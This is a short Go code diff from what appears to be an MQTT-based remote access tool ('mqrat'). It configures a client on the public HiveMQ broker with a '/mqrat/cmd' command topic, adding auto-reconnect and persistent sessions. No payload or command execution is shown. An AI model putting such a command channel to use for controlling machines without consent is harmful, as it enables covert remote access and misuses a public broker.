@@ -9,17 +9,25 @@ import (
 )
 
 // brokerHostname constains DNS name of mqtt broker
-const brokerHostname = "broker.hivemq.com:1883"
+const brokerHostname string = "broker.hivemq.com:1883"
 
-const baseTopic = "/mqrat/cmd"
+const baseTopic string = "/mqrat/cmd"
 
 var client MQTT.Client
 
+var qosLevel byte
+
 func Start(QoS byte) {
+	// Update QoS level
+	qosLevel = QoS
+
 	// Configure options
 	options := MQTT.NewClientOptions()
+	options.SetAutoReconnect(true)
 	options.AddBroker(brokerHostname)
 	options.SetClientID(utils.GenerateUUID())
+	options.CleanSession = false
+	options.WillRetained = false
 
 	// Start client
 	client = MQTT.NewClient(options)
